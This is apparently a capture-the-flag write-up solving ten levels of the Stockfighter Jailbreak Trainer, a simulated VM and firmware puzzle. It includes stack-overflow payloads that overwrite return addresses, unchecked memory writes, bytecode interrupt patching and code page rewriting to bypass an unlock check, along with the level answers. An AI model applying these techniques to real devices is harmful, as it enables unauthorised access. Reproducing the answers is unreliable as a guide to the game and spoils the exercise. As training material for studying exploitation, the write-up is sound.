# Stockfighter Jailbreak Trainer Writeup
https://www.stockfighter.io/trainer/

## Level 1
Not much needs to be said about this one.  But some useful observations:

`svm_` seems to be the prefix for the external calls we can make.
SVM = Stockfighter VM.

The C code compiles to bytecode, displayed on the right of the source viewer.  The most important thing to note is that function calls are interrupts, which are handled by the `externalCall` function.  There is a vector table around 0x100 which lists the addresses for the interrupts (note they need to be multiplied by 2 as they are word addressed).

```
int
main() {
  field_unlock();
  return 0;
}
```

## Level 2
This level makes clear that reading the White Dox and Black Dox is very helpful.

Guessing that 'encraption' probably means a simple XOR, examine the `svm_recover_unlock_code` disassembly and discover that it xors the verifier stored in memory with 2.

```
int
main() {
  field_unlock("21526881b5e5da9c0e6ddaed2de87372e0fc0a2432c2057ef996f2390567e95f");
  return 0;
}
```

## Level 3
As the Black Dox say, debugging is helpful here.  Note that the generated assembly produces a function called `unlock()`.  Calling it doesn't seem to work, but let's debug further.

Run `hits` in the debugger to see the calls that are executed.  We can break execution just after the `sprintf` in `svm_field_unlock` at 0x0ae0 and grab the unlock code.  If we call `field_unlock` with the correct parameters then we're in.

```
int
main() {
  field_unlock("1d93be6a9db6cc404a602f0552f9fe7f164eb8ebfaba18fd878ee70cf1c72c81", "Diversey");
  return 0;
}
```

## Level 4
Again reading the Block Dox, note that we need to call the unlock interrupt directly from the assembly.  Time for some blob perturbation.  Inspect the assembly to find that the correct interrupt for `svm_field_unlock` is 14.  Call the compile API and convert the produced raw (base64) to hex:

```
0000	0a:00:00:00:00	ENT	0
0005	05:00:00:00:80	IMM	128
000a	34	PUSHARG
000b	05:00:00:00:c1	IMM	193
0010	34	PUSHARG
0011	22:00:00:00:02	INT	2
0016	0b:00:00:00:02	ADJ	2
001b	05:00:00:00:00	IMM	0
0020	0c	RET
0021	0c	RET
```

Find the interrupt, `22:00:00:00:02	INT	2` and modify it so the correct interrupt is called: `22:00:00:00:14	INT	14`.  Convert back to base64 and send this modified input to the run API.

```
int
main() {
  // modify this directly in the assembly to call field_unlock instead
  printstring("6f9d66b19318502d8cb264bab9acb74e89bf36d2a2fad474382d3455f8b488dd", "Racine");
  return 0;
}
```

## Level 5
Observe that the output of the `status()` function indicates that it is privileged.  Break execution just after the `decrypt_function` has run to grab the decrypted instructions:

```
unlock
...
00b8    05:00:00:00:80    IMM    128
00bd    0d    LI    
00be    34    PUSHARG    
00bf    22:00:00:00:07    INT    7
00c4    0b:00:00:00:01    ADJ    1
...
status
...
00fc	05:00:00:00:80	IMM	128
0101	11	PSH
0102	05:00:00:00:01	IMM	1
0107	0f	SI
0108	05:00:00:00:80	IMM	128
010d	0d	LI
010e	34	PUSHARG
010f	22:00:00:00:08	INT	8
0114	0b:00:00:00:01	ADJ	1
...
```

Observe that it's setting the byte at 128 (0x80) to 1 just before calling the `field_status` interrupt.  Observe that `unlock()` is passing in the byte at 128 (0x80) as a parameter to `field_unlock` but is not setting it.  Set it to 1 manually and we're in.

```
int
main() {
  int *flag = 0x80;
  *flag = 1;
  unlock();
  return 0;
}
```

## Level 6
A simple stack overflow.  We want to rewrite the (VM level) return address to our `field_unlock` call, so compile the code and discover the address in the compiler.  Find out how much data we need to pass in to hit the return address and then overwrite it.

```
int
main() {
  status("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x03");
  field_unlock();
  return 0;
}
```

## Level 7
Observe that the `int` passed in to the blob functions is a memory address, and that this address is never validated.

Observe also that we need to change the name of the level stored in memory.  Overwrite this, as well as the return address in the stack (AVR level this time) to take us into `field_unlock` after the `field_service` check has taken place at 0x0b00.

The first two bytes used by `blob_fill()` are the length, so use address 0x0351 to avoid overwriting too much memory.

```
int
main() {
  blob_fill(0x0351, "[running]..{\"level\":\"Lake\",\"verifier\":\"%s\"}");
  blob_fill(0xee86, "\x0b");
  return 0;
}
```

## Level 8
Observe that the memory address passed in is now validated, but the string written to by `blob_recover` is not.  Write over the return address to take us into `field_unlock` after the `field_service` check has taken place.

```
int
main() {
  int blob = blob_get(3);
  blob_fill(blob, "\x0b\x54");
  blob_recover(0xfd88, blob);
  return 0;
}
```

## Level 9
Follow the Black Dox and discover `svm_page`.  Observe that `svm_page` takes two parameters: the instruction memory address and the address of the instructions to overwrite with.  For simplicity, start at the beginning of `svm_field_unlock` (0x0a09) and write the same instructions, but NOPing out the `brne .78` at 0x0aca.

Note that `svm_page` is not in the vector table, so the blob must be perturbed.

Note also that 0xf is subtracted from the new instructions to write, hence 0x0086 instead of 0xf186.

```
int
main() {
  char *page="\x0f\x93\x1f\x93\xcf\x93\xdf\x93\xcd\xb7\xde\xb7\xc0\x58\xd1\x09\x0f\xb6\xf8\x94\xde\xbf\x0f\xbe\xcd\xbf\x80\x91\xd1\x04\x90\x91\xd2\x04\xa0\x91\xd3\x04\xb0\x91\xd4\x04\x01\x97\xa1\x05\xb1\x05\x00\x00\x83\xea\x98\xe0\x9f\x93\x8f\x93\x86\xe4\x93\xe0\x9f\x93\x8f\x93\x8e\x01\x0f\x5f\x1f\x4f\x1f\x93\x0f\x93\x0e\x94\x27\x1c\xf8\x01\x01\x90\x00\x20\xe9\xf7\xaf\x01\x41\x50\x51\x09\x40\x1b\x51\x0b\xb8\x01\x84\xe2";
  // Change this interrupt to interrupt 28 in the returned blob
  field_unlock(0xa9a,0x0086);
  field_unlock();
  return 0;
}
```

## Level 10
Another simple stack overflow.  Note that `sprintf` in the `_log()` function does not restrict the input buffer.  Note also that like level 7 we have to change the level name.  If we set the return address to the `sprintf` in `svm_field_unlock` we have enough control of the stack that we can choose the arguments that are passed: pass in our own format string instead of the stored one.

```
int
main() {
  status("BABABABABABABABABABABABABABABABABAB\x0a\xe6\x42\x41\xb3\xf1\xab\x08\x29\x3a{\"level\":\"Kedzie\",\"verifier\":\"%s\"}");
  return 0;
}
```
